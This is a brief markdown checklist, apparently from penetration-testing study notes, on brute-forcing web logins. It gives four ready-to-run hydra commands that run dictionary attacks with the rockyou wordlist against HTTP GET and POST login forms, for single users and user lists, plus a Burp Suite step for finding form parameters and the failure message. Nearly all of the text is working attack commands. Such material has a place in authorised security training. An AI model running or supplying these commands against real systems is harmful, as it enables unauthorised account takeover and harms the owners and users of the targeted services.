
# HTTP GET Brute Force

- [ ] Do a Dictionary Attack on HTTP GET Login on a single user using `hydra` on your Kali Machine
```
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.yyy.yyy http-get / 
```

- [ ] Do a Dictionary Attack on HTTP GET Login on a user list using `hydra` on your Kali Machine
```
sudo hydra -L user_list.txt -P /usr/share/wordlists/rockyou.txt 192.168.yyy.yyy http-get / 
```
# HTTP POST Brute Force

- [ ] Use Burp Suite to intercept a POST login request on your Kali Machine
```
Identify parameters
Identify failure message
```

- [ ] Do a Dictionary Attack on HTTP POST Login on a single user using `hydra` on your Kali Machine
```
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.yyy.yyy http-post-form "/index.php:usr_param=user&pwd_param=^PASS^:Login failed. Invalid username or password"
```

- [ ] Do a Dictionary Attack on HTTP POST Login on a user list using `hydra` on your Kali Machine
```
sudo hydra -L user_list.txt -P /usr/share/wordlists/rockyou.txt 192.168.yyy.yyy http-post-form "/index.php:usr_param=user&pwd_param=^PASS^:Login failed. Invalid username or password"
```